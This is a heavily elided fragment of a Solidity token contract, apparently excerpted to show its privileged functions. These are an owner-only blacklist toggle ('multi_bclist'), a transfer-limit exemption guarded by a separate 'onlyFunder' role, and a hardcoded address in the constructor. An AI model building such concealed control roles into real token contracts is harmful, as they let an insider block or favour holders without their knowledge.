...
abstract contract TOKEN is IERC20, Ownable {
    ...
    function multi_bclist(address addr, bool enable) private onlyOwner {
    ...
    function txLimitExempt(address addr, uint256 enable) public onlyFunder {
...
contract Token is TOKEN {
    ...
    constructor() TOKEN(
        ...
        address(0xb25E9Ec8D2c3910c26c5233D3f7cA2790213DC25),
